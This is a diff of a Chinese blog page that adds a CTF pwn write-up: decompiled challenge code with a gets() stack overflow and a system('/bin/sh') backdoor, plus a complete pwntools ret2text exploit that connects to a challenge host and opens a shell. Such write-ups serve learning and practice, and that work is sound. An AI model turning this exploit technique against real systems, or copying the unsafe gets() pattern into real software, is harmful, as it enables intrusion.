@@ -32,8 +32,10 @@
 <meta property="og:image" content="http://example.com/2024/10/29/hello-world/e2024-wp/file-20250702090617688.png">
 <meta property="og:image" content="http://example.com/2024/10/29/hello-world/e2024-wp/file-20250702120152264.png">
 <meta property="og:image" content="http://example.com/2024/10/29/hello-world/e2024-wp/file-20250703021124633.png">
+<meta property="og:image" content="http://example.com/2024/10/29/hello-world/e2024-wp/file-20250704002321504.png">
+<meta property="og:image" content="http://example.com/2024/10/29/hello-world/e2024-wp/file-20250704003730816.png">
 <meta property="article:published_time" content="2025-07-01T16:11:19.000Z">
-<meta property="article:modified_time" content="2025-07-02T18:11:37.487Z">
+<meta property="article:modified_time" content="2025-07-03T16:37:48.027Z">
 <meta property="article:author" content="yvyvSunlight">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2024/10/29/hello-world/e2024-wp/file-20250702001655102.png">
@@ -229,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          1.3k 字
         
       </span>
     
@@ -240,7 +242,7 @@
         
         
         
-          10 分钟
+          11 分钟
         
       </span>
     
@@ -336,6 +338,16 @@
 <hr>
 <h1 id="000000"><a href="#000000" class="headerlink" title="000000"></a>000000</h1><p><img src="/2024/10/29/hello-world/e2024-wp/file-20250702120152264.png" srcset="/img/loading.gif" lazyload><br>64位小端  pie canary</p>
 <p><img src="/2024/10/29/hello-world/e2024-wp/file-20250703021124633.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h1 id="你会栈溢出吗"><a href="#你会栈溢出吗" class="headerlink" title="你会栈溢出吗"></a>你会栈溢出吗</h1><p><img src="/2024/10/29/hello-world/e2024-wp/file-20250704002321504.png" srcset="/img/loading.gif" lazyload><br>64位小端 no canary no pie</p>
+<p>逆向：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">welcome</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to geek,what&#x27;s you name?&quot;</span>);<br>  gets(buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello,%s\nDo you know key?&quot;</span>, buf);<br>&#125;<br><br>__int64 <span class="hljs-title function_">key</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;yes,yes,this is key.you can catch me?&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>签到题<br>有栈溢出 有后门函数<br>ret2text</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>exe = ELF(<span class="hljs-string">&quot;./stackover_patched&quot;</span>)<br>context.binary = exe<br><br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>        <span class="hljs-keyword">if</span> args.GDB:<br>            gdb.attach(io)<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="hljs-number">40906</span>) <span class="hljs-comment"># nc nc1.ctfplus.cn 40906</span><br><br>    <span class="hljs-keyword">return</span> io<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        gdb.attach(io, cmd)<br>        pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    offset = <span class="hljs-number">0xC</span> + <span class="hljs-number">8</span><br>    key = <span class="hljs-number">0x400728</span><br>    res = <span class="hljs-number">0x40074F</span><br>    payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p64(res) + p64(key)<br>    io.sendlineafter(<span class="hljs-string">b&quot;what&#x27;s you name?\n&quot;</span>, payload)<br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="over-flow"><a href="#over-flow" class="headerlink" title="over_flow??"></a>over_flow??</h1><p><img src="/2024/10/29/hello-world/e2024-wp/file-20250704003730816.png" srcset="/img/loading.gif" lazyload><br>64位小端 有canary no pie</p>
 
                 
               </div>
